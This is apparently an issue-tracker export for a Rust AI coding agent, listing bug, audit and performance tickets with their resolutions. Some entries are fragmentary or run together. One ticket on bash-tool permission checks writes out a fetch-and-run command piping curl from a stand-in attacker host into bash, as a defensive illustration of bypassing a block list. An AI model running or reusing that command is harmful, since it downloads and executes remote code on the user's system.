close_reason: Implemented: non-text tool results now emit a warning and visible fallback output, with image-only unit coverage

title: BUG: Tool interactions vector grows unbounded across continuations
description:
## What is wrong
The tool_interactions vector is initialized at line 340 and appended to at lines 421 (tool_call) and 458 (tool_result). This vector is passed to continue_prompt_injector at line 557, where it's added to the history via extend_from_slice at line 275 of continue_prompt_injector. The vector is never pruned. With up to 11 outer loop iterations and potentially 10+ tool calls per iteration, the vector could contain 100+ Message items. Each continuation adds all prior tool interactions to history again, causing redundant context inclusion.

## Exploit / failure scenario
A session with multiple continuations accumulates all tool interactions in memory and context. A 100-tool-call session with 5 continuations includes 500+ tool interaction messages in final context, wasting tokens and potentially exceeding context window for no benefit (model already saw all previous interactions).

## Fix
Track the count of tool interactions sent in prior continuations and only include new interactions in subsequent continuations. Or, implement a sliding window that keeps only the most recent N tool interactions.

## Verification
Add logging to track tool_interactions.len() at each continuation. Verify it remains constant or slowly grows, not linearly with iteration count.

## Location
/Users/ahrens/projects/mini-agent/src/agent/runner.rs:340
close_reason: Implemented: drain tool interactions after each continuation injection in interactive and headless runners, log each new batch size, and add regression coverage for non-replay across continuations

title: BUG: track_read off-by-one error in displayed end line number
description:
## What is wrong
The track_read function calculates the end line for the repeated-read error message as (offset + limit).saturating_sub(1). For a 0-indexed offset with limit lines, this produces the wrong 1-indexed end line. If offset=0 and limit=10, the message shows 'lines 1-9' instead of 'lines 1-10'.

## Exploit / failure scenario
User reads file lines 1-10 (offset=1, limit=10 which becomes 0-indexed as offset=0, limit=10). If they attempt to re-read the same range, the error message says 'lines 1-9 was already read' instead of 'lines 1-10 was already read'.

## Fix
Remove the saturating_sub(1). Change line 53 to: let end = offset + limit; The 1-indexed end line is simply offset + limit when offset is 0-indexed.

## Verification
Test with offset=0, limit=10: message should show 'lines 1-10'. Test with offset=5, limit=5: message should show 'lines 6-10'.

## Location
src/agent/tools/mod.rs:53
close_reason: Implemented: corrected repeated-read end line calculation for zero-based offsets

title: INCOMPLETE: Async hook handlers spawned without tracking or awaiting
description:
## What is wrong
When handler.is_async is true, the handler is spawned with tokio::spawn() without storing the JoinHandle or awaiting it. This creates fire-and-forget tasks with no way to ensure they complete before the dispatch function returns. If the agent is cancelled or exits while async handlers are in flight, they may be interrupted mid-execution and leave side effects incomplete.

## Exploit / failure scenario
Async hook (e.g., a webhook to notify external system) is spawned → dispatch() returns immediately → agent task is cancelled or finishes → tokio runtime ends before async hook completes → webhook is never sent or partially sent.

## Fix
Collect JoinHandles from all async handler spawns and either: (1) track them and await them before the next major operation, (2) wrap them in a GuardDrop similar to SubagentGuard to abort them if the parent is cancelled, or (3) use structured concurrency to ensure async handlers are awaited before dispatch returns.

## Verification
Create an async hook that logs completion to a file. Spawn it, then immediately cancel the agent or exit. Verify the log file contains the completion message (hook finished) rather than being absent or truncated.

## Location
src/extras/hooks/dispatcher.rs:307
close_reason: Implemented: retain and await async hook JoinHandles before dispatch returns, with regression coverage for completion and ignored decisions

title: MISSING-FEATURE: Unused PermRequest and PermResponse types suggest incomplete permission integration
description:
## What is wrong
PermRequest (line 31) and PermResponse (line 38) are defined but never constructed or used anywhere. The tool.rs check_perm() at line 54 checks permissions before sending code to the JS engine, but there is no mechanism for the JS engine thread to request permission for individual host calls (spawn, read_file, write_file). This means all three host calls are allowed unconditionally once the initial code is approved.

## Exploit / failure scenario
User disallows 'spawn' permission in their profile. A script passes initial permission checks, then calls spawn() inside the JS engine. The spawn() call executes without permission check because the host.rs functions don't consult the permission system — they call std::process::Command directly.

## Fix
Complete the permission integration: (1) Use PermRequest/PermResponse to send permission checks from host.rs back to the tokio runtime; (2) Have make_spawn(), make_read_file(), make_write_file() send PermRequest through a channel (passed via closure or thread-local); (3) Wait for PermResponse before executing the operation; (4) Update tests to verify permission denial blocks individual host calls.

## Verification
Set permission to deny 'spawn', run JS that calls spawn(), confirm it returns permission error.

## Location
src/extras/js/types.rs:31
close_reason: Implemented: all JS host calls use the owned PermRequest/PermResponse permission bridge; end-to-end tests verify denied read_file, write_file, and spawn calls return permission errors without side effects

title: BUG: glob_to_regex doesn't escape regex special characters
description:
## What is wrong
The glob_to_regex function converts glob patterns to regex but only escapes '.' and handles glob wildcards. Other regex special characters like '(', ')', '[', ']', '+', '^', '$', etc. are not escaped. If a glob pattern contains these as literal characters, they'll be misinterpreted as regex metacharacters.

## Exploit / failure scenario
User calls grep with include='test(1).js' intending to match files literally named 'test(1).js'. The function produces regex 'test(1)\.js', which matches 'test1.js' instead because '(1)' is a capturing group, not literal characters.

## Fix
Add escaping for all regex special characters that are not part of glob syntax. Characters to escape: ( ) [ ] + ^ $ | \. Use: re.push_str(&regex::escape(&c.to_string())) for non-glob chars, or maintain a list of safe pass-through characters.

## Verification
Test glob_to_regex('test(1).rs') and verify it matches only 'test(1).rs', not 'test1.rs'. Also test with patterns like 'file[1].js', 'prefix+.js', etc.

## Location
src/agent/tools/grep.rs:22
close_reason: Implemented: escaped literal regex metacharacters in grep include globs with regression coverage

title: PANIC: Embedded JSON parsing can panic at startup
description:
## What is wrong
The embedded models.json is parsed at static initialization time with .expect(). If the JSON file is malformed or incompatible with the RawModel struct, the entire application panics during startup with no recovery.

## Exploit / failure scenario
If data/models.json is corrupted or has schema changes, serde_json::from_str() fails and panics: 'embedded data/models.json is malformed'

## Fix
Return Result<LazyLock<...>> or convert to lazy initialization that handles errors gracefully, logging a warning and providing an empty fallback catalog

## Verification
Temporarily corrupt data/models.json and verify application starts with degraded functionality instead of panicking

## Location
src/models_catalog.rs:35
close_reason: Implemented: gracefully fall back to an empty embedded model catalog with a warning when JSON parsing fails, with regression coverage

title: INCOMPLETE: Insufficient shell metacharacter escaping in bash tool command splitting
description:
## What is wrong
The bash tool splits commands on certain operators (&&, ||, |, >>, ;) for permission checking, but splits only on the operators that appear outside quotes. This could lead to incomplete permission checks if an attacker encodes restricted commands inside shell constructs that are not recognized. While the full command is still passed to sandbox.output_command, the permission system only sees the split tokens. Example: 'echo ok; eval(base64)' might get split only by semicolon, but if quotes are involved, some dangerous constructs might be missed.

## Exploit / failure scenario
Attacker provides: echo hello && (curl evil.com | bash). split_bash_commands splits on && to get ['echo hello', '(curl evil.com | bash)']. Permission check is done on each part separately. If 'curl' is not blocked in permission list, the attacker bypasses curl blocking.

## Fix
Strengthen permission checking for bash: (1) perform static analysis on the AST instead of token-based splitting, (2) deny all commands by default and use allowlist instead of denylist, or (3) document that bash tool assumes the permission checker validates the entire command string including all subshells and pipes

## Verification
Create permission rules that block 'curl', then attempt to run: echo safe && (curl evil.com); verify that either the curl command is denied or it's documented that partial command analysis is not supported

## Location
/Users/ahrens/projects/mini-agent/src/agent/tools/bash.rs:128
close_reason: Implemented: subsumed by mini-agent-tcn; Bash now uses exact opaque full-script authorization, removes ad-hoc splitting, fails compound scripts closed before launch, and includes documented regression coverage

title: [AUDIT] Add enforced dependency vulnerability, license, and update policy gates
description:
## Problem / security impact
The current dependency snapshot has no known medium-or-higher advisory finding from the review, but CI does not enforce advisory, license/source, or stale-security-update policy. Future vulnerable or disallowed dependencies can merge unnoticed.

## Scope / files
- `Cargo.toml` and `Cargo.lock`
- `.github/workflows/ci.yml`
- new `deny.toml`/advisory policy or equivalent
- dependency policy documentation and exception ownership

## Required implementation
Add locked dependency advisory checking and license/source policy using maintained Rust tooling (for example `cargo audit` plus `cargo deny`). Define severity/yank/unmaintained policy, allowed licenses, denied git/unknown sources, duplicate/version policy where useful, and a time-bounded exception format with owner, rationale, advisory/license ID, and expiry. Run on lockfile/dependency changes and on a schedule. Add update automation or a documented cadence that opens reviewed updates without auto-merging security-sensitive major changes.

## Acceptance criteria
- CI fails for an unexcepted vulnerable, yanked, disallowed-license, or disallowed-source dependency.
- Exceptions are explicit, scoped, owned, justified, and expire.
- Checks consume the committed lockfile and cannot silently update around a finding.
- Scheduled scans detect advisories even without code changes.

## Validation
Run `cargo audit --locked` and `cargo deny check` with the checked-in policy. Add CI fixtures or policy-unit checks proving a fake denied license/advisory/source and expired exception fail. Expected current baseline: no unexcepted medium-or-higher advisory and all dependency licenses/sources satisfy policy.
acceptance_criteria: Locked advisory and license/source gates run in CI and on schedule, fail on unexcepted violations, and support only owned, scoped, expiring exceptions.
close_reason: Implemented: locked cargo-audit/cargo-deny CI gates, expiring exception validation, policy tests, scheduled scans, and reviewed update automation

description:

## Scope / files

- AUR, Conda, Homebrew/tap, Nix, release workflow, and installer metadata under `packaging/`, `tap/`, `nix/`, and `.github/`

Add a deterministic CI script that parses every in-repo channel, archive name, checksum manifest, and package formula; fail on version or feature mismatch. If a channel intentionally lags, represent the lag explicitly with a documented policy rather than silently comparing unequal versions. Validate artifact URLs target the same tag/version and architecture naming.

## Acceptance criteria
- Cargo/AUR/Conda/Homebrew/Nix/installer/release metadata agree on the current version or an explicit allowed lag policy.

Keep this separate from compile CI. If Windows releases are not supported, remove/qualify product claims instead of emitting an untested artifact.

title: [AUDIT] Canonicalize the JS specification corpus and phase authority
description:
## Problem / security impact
`ARCHITECTURE.md`, `SPEC.md`, phase specs, and the dated JS blueprint disagree on identity, permissions, feature relationships, and phase behavior. Implementers cannot tell which text is normative, allowing unsafe or obsolete requirements to be selected opportunistically.

## Scope / files

## Required implementation
Declare one normative source of truth, preferably the indexed phase specs. Mark `SPEC.md` as a generated/overview document or reconcile it line-by-line. Mark the dated blueprint superseded/archival and link to the authoritative replacement. Add document version/status, ownership, phase entry/exit dependencies, and conflict-resolution rules. Reconcile known contradictions: permission gating for file globals, sandbox guarantees, full skill identity including tests, exact test semantics, feature relationships, Windows behavior, and auto-admission gate ownership. Do not leave duplicate normative examples with different behavior.

- Every JS design document declares normative, overview, or superseded status.
- `docs/specs/00-index.md` states authority and phase dependency/exit semantics.
- Searches find no conflicting short-hash identity, unrestricted Phase 1 file access, or unsupported sandbox/platform claim.

Run the repository documentation/link check if present. Review the final diff against the conflict list in this issue; no code change is required.

title: [AUDIT] Protect session persistence with private filesystem permissions
description:
## Problem / security impact
Session persistence in `src/session/storage.rs:44-85` can create directories/files with process-default permissions. Sessions may contain prompts, source, command output, or secrets and must not become readable by other local users.

## Scope / files
- `src/session/storage.rs:44-85`
- atomic-write helper interaction
- session storage tests and user-facing storage documentation

## Required implementation
On Unix create session directories as `0700` and files, lock files, and temporary files as `0600` from creation time (not chmod only after writing). Define behavior for existing paths with broader modes: repair safely when owned and regular, otherwise reject with a clear error. Do not follow symlinks while repairing. Preserve platform-appropriate behavior on Windows and explicitly document that ACL enforcement differs.

## Acceptance criteria
- New directories are `0700`; new/final/temp files are `0600` independent of umask.
- Unsafe existing regular-file modes are repaired or rejected according to the documented policy.
- Symlink and wrong-owner/non-regular paths are rejected without mutation.
- Failure cleanup does not leave readable temporary session content.

## Validation
On Unix run `cargo test session_storage_permissions`; set permissive umasks and assert exact modes for directories, temporary files, final files, repair/reject cases, and symlinks. Run `cargo test`. Add a non-Unix test for the documented branch and ensure CI exercises it where available.
acceptance_criteria: Session directories/files/temp/lock files are private from creation, unsafe existing paths are safely repaired or rejected, Unix modes are exact, and real Windows ACL tests exclude broad inherited read access.
notes: 2026-07-28 Windows gate: session/final/temp/lock files need a tested private DACL and reparse-safe behavior on real Windows; merely documenting that ACLs differ does not satisfy cross-platform privacy.

title: [D2] Retrieve skills from the user prompt before model generation and publish a turn manifest
description:
## Outcome
Perform provider-neutral discovery once from the current user prompt before model generation, sharing one compatible query embedding while keeping Agent Skills instructions, learned-JS code, and MCP tools as separate typed/authority domains.

## Owned files and boundaries
- `src/agent/runner.rs`: user-turn boundary and retrieval-before-first-stream ordering.
- `src/extras/js/skills/turn.rs` (or established turn module): normalized query, fingerprints, typed `TurnDiscoveryBundle`/`TurnSkillBundle`, deterministic manifest assembly and budgets.
- `src/extras/js/tests/prompt_time_skill_retrieval.rs`: order, retries, typed-domain, provider, and failure fixtures.

Consume the shared `Embedder`, learned-JS `SkillIndex`, and Agent Skills catalog/loader. `mini-agent-dqf` owns binding learned-JS source into JS requests/runtime. Existing MCP builder/tool code remains authoritative for advertised schemas and permission-wrapped invocation.

## Required implementation
1. At each user-turn boundary, build one bounded deterministic retrieval query from the current prompt plus an explicitly bounded recent-task suffix. Exclude generated JS, tool output, unbounded history, timestamps, secrets, and random IDs.
2. Normalize/fingerprint/embed that query once. Fan the already-computed vector only to compatible typed indexes; learned JS and Agent Skills retain independent score floors, top-k, byte/token budgets, dedupe, generations, and failure diagnostics.
3. Freeze query fingerprint, model revision, each index generation, selected IDs/digests, scores, and exact resolved content in one immutable per-turn bundle. Retries and continuations reuse it; a later user prompt creates a new one.
4. Before the first model token, inject selected Agent Skills as bounded trusted instruction sections with digest/provenance and full selected `SKILL.md` body. Inject learned JS as a compact manifest of full IDs, descriptions, exports/signatures, and capability manifests only; source reaches only `mini-agent-dqf`.
5. Keep MCP tool schemas in the provider tool channel. Agent Skill `allowed-tools`, instruction text, and learned-JS metadata cannot grant MCP/host permission, invoke a server, or change existing `mcp_tool:{server}:{tool}` checks.
6. Enforce deterministic section order and independent budgets. A failure in one domain yields an empty diagnostic-bearing section for that domain without substituting unscored content or disabling primitive JS/MCP.
7. Preserve provider independence, history semantics, and token accounting; no store/index call or reranking occurs on the QuickJS thread or from model-generated code.

## Non-goals
Do not import/index Agent Skill archives, generate stored embeddings, rank inside the embedder, expose learned source in the prompt, execute Agent Skill resources/scripts, auto-approve capabilities, or vector-search MCP tools unless a separate measured/spec-approved task is filed.

## Acceptance Criteria

title: [D2] Build immutable exact dense + FTS SkillIndex with deterministic fusion
description:
## Outcome
Implement `SkillIndex: Send + Sync` for deterministic, bounded hybrid retrieval of up to 100,000 immutable learned-JS revisions using exact pre-normalized dense search plus FTS5/BM25 fusion.

## Owned files and boundaries
- `src/extras/js/skills/index.rs`: immutable snapshot types, dense search, lexical candidate search, RRF fusion, lifecycle/model filtering, dedupe, and budgets.
- `src/extras/js/tests/skill_index.rs`: relevance, lifecycle, determinism, concurrency, and no-request-scan fixtures.

Input is one generation snapshot plus an already-computed compatible query vector/text. Output is bounded identity/metadata/source handles from that same generation. `mini-agent-zea` owns inference, `mini-agent-yxy`/`q0i` own persistence/identity, `mini-agent-af7.1` owns rebuild/publication, and `mini-agent-h3q` owns turn activation.

## Required implementation
1. Build immutable generation-stamped snapshots only from identity-valid active rows. Keep full IDs/metadata and pre-normalized equal-dimension `f32` vectors in deterministic contiguous storage; vector BLOBs are read only while building a snapshot.
2. Perform exact dot-product top-k with bounded candidate selection. Query FTS5/BM25 only over bounded identifiers, exports/signatures, tags, and descriptions, then fuse ranked lists by configured RRF.
3. Apply calibrated dense/lexical floors, permit zero results, deterministic full-ID tie breaks, semantic/lineage dedupe, and independent manifest/source count+byte budgets.
4. Exclude pending, canary, rejected, quarantined, superseded, retired, corrupt, identity-invalid, and model-incompatible rows. Phase 5 canary routing happens only after active-lineage retrieval and never lets candidate/predecessor compete.
5. Keep search read-only and safe for concurrent callers. Configuration/relevance fixtures own thresholds and fusion constants.

## Non-goals
Do not embed queries or stored skills, migrate models, publish generations, activate context, index Agent Skill instructions, or add ANN/HNSW. ANN requires the measured follow-up defined by `mini-agent-af7.2` if exact search misses its gate.

## Acceptance Criteria
- Search performs no stored-skill embedding or SQLite vector-table scan and returns one deterministic generation-consistent bounded result set.
- Dense, lexical, mixed, irrelevant/below-floor, duplicate, tie, and all lifecycle/model mismatch fixtures produce specified rankings or zero results.
- Concurrent reads are lock-bounded and deterministic while a separate snapshot is constructed.
- At 100,000 revisions, the implementation exposes the independent timing/memory counters required by the benchmark task.

title: [D2] Implement reusable versioned Embedder and bounded query cache
description:
## Outcome
Implement one reusable model-versioned embedding service for learned JS and Agent Skills, with batched document inference and one bounded prompt-query cache instead of per-call model construction.

## Owned files and boundaries
- `src/extras/js/skills/embed.rs`: `Embedder` API, model lifecycle/metadata, document/query embedding, normalization, worker admission, and cache.
- `src/extras/js/tests/skill_embedder.rs`: deterministic fake backend plus optional real-model smoke fixtures.
- `Cargo.toml`/`Cargo.lock` only for the optional embedding dependency/features.

Inputs are bounded deterministic text documents or a normalized retrieval query. Outputs are finite normalized vectors plus exact model ID/revision/dimensions/normalization metadata. Store/index/catalog callers persist or rank outputs; the embedder does neither.

## Required implementation
1. Initialize configured BGE-small-en-v1.5 (or the exact spec-selected revision) once per service and expose immutable model metadata. Multiple indexes share the same service instance.
2. Build deterministic learned-JS documents from description, exports/signatures, normalized tags, and bounded sorted identifiers. Provide a typed document constructor so Agent Skills can supply their distinct metadata document without entering learned-JS storage.
3. Batch document embeddings for admission/reindex/catalog refresh and provide one prompt-query embedding API. Validate non-empty, finite, equal-dimension output and normalize once.
4. Run CPU inference in a bounded blocking worker with cancellation and saturation errors; never run model work on the QuickJS or async executor thread.
5. Cache queries by `(model_revision, sha256(normalized_retrieval_query))` with explicit entry/byte bounds and deterministic eviction. The same vector may fan out to typed indexes only when model metadata matches.
6. Return typed, redacted errors for model initialization/download, empty/non-finite/wrong-dimension output, cancellation, worker panic, and saturation.

## Non-goals
Do not open SQLite, persist embeddings, build/search an index, select context, merge trust domains, initialize a separate Agent Skills model, or lazily embed stored artifacts during a request.

## Acceptance Criteria
- Concurrent callers cause one model initialization and bounded worker use; cancellation/saturation cannot deadlock startup or prompt processing.
- Document bytes and query fingerprints are deterministic, cache bounds/eviction are observable, and all returned vectors carry exact compatible metadata.
- Admission/reindex APIs batch stored documents; prompt-time code embeds only the normalized query once and never a stored skill.
- Failure yields typed diagnostics and an empty typed retrieval domain rather than unscored content.

title: [D2] Implement bounded structured propose_skill host enqueue
description:
## Outcome
Implement bounded structured `propose_skill({...})` validation and asynchronous durable enqueue without synchronous verification, embedding, SQLite access, or capability escalation in QuickJS.

## Owned files and boundaries
- `src/extras/js/skills/proposal.rs`: proposal input/result types, bounds, normalization, identity construction, session-budget interface, enqueue adapter.
- `src/extras/js/tests/propose_skill_host.rs`: validation, budget, backpressure, idempotency, and redaction fixtures.

## Required implementation
1. Accept bounded source, description, exports/signatures, embedded tests, normalized tags, capability `{tier, allowed_hosts}`, and optional predecessor ID.

5. Never log source/tests/arguments and never expose held-out suite data to the caller runtime.

- Valid input returns a full canonical ID and durable pending status; duplicate retries are idempotent.
- Saturation/cancellation/store failure cannot block the JS thread indefinitely or leave a falsely successful result.
- Host execution performs no inline evaluation, embedding, permission effect, or held-out access.

title: [D2] Create versioned SkillStore schema and identity-validating persistence foundation
description:
## Outcome
Create the versioned SQLite persistence foundation for immutable learned-JS revisions. SQLite is authoritative durable state, but it is never held by `JsTool`/`JsRequest`, used from the QuickJS thread, or scanned for vectors on a prompt-time request.

## Owned files and boundaries
- `src/extras/js/skills/store.rs`: connection construction, schema versions/migrations, typed rows and transaction helpers.
- `src/extras/js/tests/skill_store_schema.rs` (or the established JS test module): migration, constraint, FTS, path, and corruption fixtures.
- `Cargo.toml`/`Cargo.lock` only if bundled SQLite feature support must change.

This task owns schema and typed persistence primitives. `mini-agent-q0i` owns canonical identity and lifecycle-safe CRUD; `mini-agent-zea` owns embedding generation; `mini-agent-y9e` owns retrieval snapshots/ranking; `mini-agent-af7.1` owns generation publication.

## Required implementation
1. Open `<AppPaths.local_data_dir>/skills/skills.db`, create private parent storage through the shared path/security contract, enable foreign keys, and run idempotent transactional migrations. Tests inject temporary `AppPaths`; no CWD or repository-local database fallback.
2. Define `skill_revisions` immutable artifact fields, full identity, exact capability manifest, lifecycle status including terminal `rejected`, lineage links, optimistic row version, and timestamps.
3. Define model-versioned `skill_embeddings` keyed by skill/model/revision with dimensions and normalization metadata; incompatible vectors remain durable but ineligible.
4. Define FTS5 tables/triggers for bounded identifiers, descriptions, normalized tags, and exports/signatures plus all lifecycle/foreign-key/CHECK/index constraints required by the Phase 3 spec.

## Non-goals
Do not compute identities, expose public activation/deletion APIs, initialize embedding models, rank results, publish snapshots, import Agent Skills, or put a SQLite connection/QuickJS type into a `Send + Sync` tool/request.

## Acceptance Criteria
- Empty, prior-version, reopened, interrupted, and concurrent-open databases converge idempotently to one supported schema or return a typed error without partial migration.
- Foreign keys, lifecycle transitions, FTS triggers, full capability JSON, model metadata, and unsupported-future-version behavior are enforced by executable fixtures.
- Linux/macOS/Windows path fixtures always select local machine data through `AppPaths`; no test leaves `skills.db` in the repository.

title: Share the renderer's input wrap layout with the editor's Up/Down memo
description:
- Priority: P3
- Dimension: cpu
- Confidence: high
- WHAT: The same input buffer is wrapped and copied twice at the same width: `Renderer::input_layout` keeps an incremental memo (`rewrap_edit` for >= 4 KiB, `text: Arc<str>` copy) and `InputEditor::ensure_wrap_memo` does a full `wrap::wrap_rows` of the whole buffer plus a full `CompactString` copy whenever Up/Down follows an edit. After a 200 KB paste every Up/Down after a keystroke re-wraps 200 KB (~1 ms) and the buffer is retained three times (buffer, editor memo text, renderer `Arc<str>`).
- WHERE: src/ui/input/mod.rs:431-456 `ensure_wrap_memo`: `let rows = wrap::wrap_rows(&self.buffer, width);` (441) and `memo.text.clone_from(&self.buffer);` (445), struct field `wrap_memo: Option<WrapMemo>` (364), `WrapMemo` (373-377), consumer `move_visual_row` (1634-1651); src/ui/renderer.rs:1646-1693 `input_layout` with `text: Arc::from(input)` (1689) and `rows: Arc::new(rows)` (1691); the width is already unified by `input.set_wrap_width(renderer.input_wrap_width())` in src/ui/mod.rs:262.
- HOW: Add `Renderer::input_rows(&self) -> Option<(usize /*width*/, Arc<str>, Arc<Vec<VisualRow>>)>` returning the memo; in `draw_main_frame` right after `renderer.sync_input_height(&input.buffer)` call `input.adopt_wrap_rows(width, text, rows)`. Make `WrapMemo` hold `text: Arc<str>` and `rows: Arc<Vec<VisualRow>>`; `ensure_wrap_memo` validates with `*memo.text == *self.buffer` as today (no copy when adopted) and only falls back to `wrap_rows` when no frame has laid out the current text yet. Net: zero extra wraps for row movement after a frame, one fewer buffer copy.
- VERIFY: `cargo test --bin mini-agent -- typing_after_a_large_paste_rewraps_only_the_edited_line` (renderer.rs:4672). The test-only counter `InputEditor::wrap_layouts()` (input/mod.rs:425) has no test today: add one that pastes 100 KB, draws a frame, presses Up/Down and asserts `wrap_layouts() == 0` and `renderer` `FrameStats.input_layouts == 1`.

title: Skip the forced Git refresh after read-only tool results
description:
- Priority: P3
- Dimension: processes
- Confidence: high
- WHAT: Every `ToolResult` marks the repository changed, which makes the next dispatch `force: true` and bypasses the metadata fingerprint. When the statusline includes `git_changes`/`git_status` this spawns `git status --porcelain=v2 --branch` up to once per second (`GIT_POLL_MIN_SPACING`) for the whole turn although ~70-80 % of tool calls (read, grep, find_files, list_dir, web_search, todo_read...) cannot change the worktree. Even with the default statusline (no status items) each forced refresh is a `tokio::spawn` + two `spawn_blocking` + ~8 stat/read syscalls per second of tool activity.
- WHERE: src/ui/app.rs:2557-2566 (agent_rx arm of `run_inner`): `if matches!(event, AgentEvent::ToolResult { .. } | AgentEvent::FileMutation { .. } | AgentEvent::Done { .. } | AgentEvent::Error { .. }) { self.loop_state.git_poll.mark_changed(std::time::Instant::now()); }`; src/ui/git_poll.rs:107-122 `GitPoll::start`: `force: self.forced || stale`; src/ui/app.rs:2320-2334 `request_git_status_refresh`; src/session/mod.rs:1470-1494 spawns git; predicate exists at src/agent/runner.rs:666 `tool_may_mutate_workspace`.

Optional: in `handle_user_event_batch` (app.rs:3340-3346) only `mark_changed` on Enter when the submitted text starts with `!` or `/`, as the comment there intends. title: Seed the first ledger flush from the verified checkpoint instead of a full-file scan
description:
- Priority: P3
- Dimension: io
- Confidence: medium
- WHAT: Startup reconciliation already uses `usage.checkpoint` to scan only the ledger tail (`session_summary`), but the first `Ledger::flush` of the process (`flush_scan` with an empty `flush_cache`) re-reads and parses the WHOLE `usage.jsonl` (bounded 64 MiB / 65,536 rows, ledger.rs:12-13) to build `Scan.identities: BTreeMap<Uuid,[u8;32]>`, and then retains that map for the process lifetime in `flush_cache` (~65k x (16+32+node overhead) ~ 4-5 MB at the cap). Later flushes only scan appended bytes (`scan_appended`), so this is a once-per-process cost — but it is an extra full read of the ledger right after startup just avoided reading it (note at startup.rs:1248-1250: "Appends still scan it fully").
- WHERE: `src/spend/ledger.rs:590-616` (`flush_scan`: `let cached = self.flush_cache...take(); ... scan(file, None)`), `:447-505` (`session_summary` -> `load_checkpoint` -> `TailScan.scan(&tail)`), `:1015-1025` (`TailScan { offset, records, ids: HashSet<Uuid>, all_time, sessions, prefix, checkpointable }`), `:123-142` (`Scan`, `FlushCache`), `:618-690` (`flush_rows` uses `scanned.identities.get(&row.id)` -> `*previous == fingerprint` for conflict detection).
- HOW: Store per-receipt fingerprints in the checkpoint (`CHECKPOINT_VERSION` 1->2: `ids` becomes `BTreeMap<Uuid,[u8;32]>`, already SHA-256 per row in `scan_with`), and in `flush_scan`, when `flush_cache` is empty, call `load_checkpoint(binding, file, length)` and, if it verifies, build the `Scan` from it (`identities` = checkpoint fingerprints, `summary.all_time` = checkpoint totals, `records`, `bytes = offset`) and `scan_appended` only `[offset, length)`. Fall back to the full `scan(file, None)` when no checkpoint verifies. Alternatively (smaller change) have `session_summary` populate `flush_cache` with the `Scan` it can derive, since it runs under the same `io` mutex before any flush.
- VERIFY: `src/spend/ledger.rs::repeated_flushes_do_not_reread_the_ledger_prefix` (:1536), `startup_checkpoint_scans_only_the_tail_and_equals_a_full_scan` (:1592), `spend_ledger_recovers_post_checkpoint_charges_without_importing_or_doubling_rows` (:1848), `usd_budget_concurrent_profile_receipts_share_io_and_never_double_or_drop_charges` (:1762). title: Overlap the headless `git status --untracked-files=all` baseline with MCP connect and agent build
description:
- Priority: P3
- Dimension: processes
- Confidence: high
- WHAT: In `-p --output json|stream-json`, `capture_workspace_change_baseline` spawns `git status --porcelain=v1 -z --untracked-files=all --no-renames` and AWAITS it (plus a `spawn_blocking` stat pass over every dirty path) before anything else; only then does the code connect MCP servers and build the agent. title: Windows helper: make the per-command writable-tree hardlink walk cheaper (it walks the whole workspace on every command)
description:

title: Compare the materialized Git runtime against the verified embedded payload instead of re-reading 6 MB into memory and re-hashing it
description:
- Priority: P3

- WHAT: At every cold start `GuardedRuntime::materialize` reads each on-disk runtime file fully into a `Vec` (`read_bounded`, 3.9 MB + 2.3 MB + 2.3 MB ~ 8.5 MB transient heap) and SHA-256-hashes it, after `validate_approval` has already proved (once per process, memoized) that the embedded `contents` match the same `sha256`. title: Allow idle keep-alive connections inside the per-host pinned web client

title: Skip the redundant re-read and SHA-256 of the file before the formatter runs
description:
- Priority: P3
- Dimension: io
- Confidence: medium
- WHAT: `FormatAfterEdit::run` reads and hashes the just-written file three times per formatted mutation: once right after capture (`initial`), once again after the permission check (`current`) and once after the formatter. The second read+digest only guards against a change during an interactive prompt, but it is paid on every call even when `check_perm` returned immediately (the common already-allowed case). For a 1 MiB file that is 2 MiB of extra reads and two extra SHA-256 passes (~2-3 ms) per edit, on top of the edit's own read and digest.
- WHERE: src/agent/tools/format_after_edit.rs:127-133 `let expected = ContentDigest::of(committed.as_bytes()); let initial = match snapshot(Arc::clone(&target), limit).await { Some(snapshot) if ContentDigest::of(snapshot.text.as_bytes()) == expected => snapshot, ...`; src/agent/tools/format_after_edit.rs:145-148 `} else if !matches!(snapshot(Arc::clone(&target), limit).await, Some(current) if crate::fs::ensure_same_file(path, &initial.identity, &current.identity).is_ok() && ContentDigest::of(current.text.as_bytes()) == expected)`; src/agent/tools/format_after_edit.rs:187 `snapshot(Arc::clone(&target), limit).await`.
- HOW: (a) Reorder so the first snapshot happens after `check_perm`/`admit_current_effect` (lines 137-141): take `initial` once there, compare its digest to `expected`, and drop the second `snapshot` at 145-147 entirely — the identity/digest check at that point is exactly what the 145 branch does, and nothing awaits between it and `output_command_with_limits`. If a review wants the "changed after approval" status string preserved, keep the branch but implement it as a metadata-only check: `Target::read` already captures `identity` (CheckedMetadata); compare `ensure_same_file` plus `len`/`mtime` from an `fstat` without reading bytes, and only fall back to a full read+digest when those differ. (b) Also skip the digest in `snapshot` at 128-129 when `committed.len() != snapshot.text.len()` (cheap early reject).
- VERIFY: src/agent/tools/format_after_edit.rs tests `format45_actual_write_failure_preserves_commit_and_reports_observed_final_diff`, `format45_actual_edit_uses_final_excerpt_and_does_not_authorize_overwrite`, `format45_actual_read_denied_source_and_formatter_output_stay_private`, `format45_template_*`. Add a test with a counting `Target::read` (wrap `read` with an `AtomicUsize` under `#[cfg(test)]`) asserting 2 reads per successful formatted edit instead of 3, and one where the file is replaced between approval and run still yields "Formatter skipped: target changed after approval".

title: Cut the 3 extra whole-file copies per edit/write by moving content through the blocking publication
description:
- Priority: P3
- Dimension: memory
- Confidence: high
- WHAT: After reading an edit target of S bytes, the edit path clones the content three more times: `preview_before` (S), the checkpoint `Preimage` (S) and `owned_output` for the blocking publish (S). Write does the same for its overwrite path (`current.clone()` + `args.content.clone()` + the `to_owned()` preview). Peak resident memory per mutation is 4-5S and ~3S of memcpy; for the 1 MiB cap that is ~4 MiB per edit and ~1 ms of copying.
- WHERE: src/agent/tools/edit.rs:1303-1307 `let preview_before = (... && disclose_source).then(|| content.clone());`; src/agent/tools/edit.rs:1333-1336 `Some(crate::session::file_checkpoints::Preimage::new(content.clone().into_bytes(), &base))`; src/agent/tools/edit.rs:1376 `let owned_output = output.clone().into_bytes();` followed by `spawn_blocking_scoped(move || workspace.replace_relative_atomic_expecting(&owned_relative, &owned_output, &expected, &base))`; src/agent/tools/write.rs:318-322 (`.to_owned()` preview), 328 `current.clone()`, 337 and 355 `let content = args.content.clone().into_bytes();`; src/session/file_checkpoints.rs:668-678 `pub(crate) struct Preimage { bytes: Vec<u8>, hash: String }` / `fn new(bytes: Vec<u8>, ..)`.
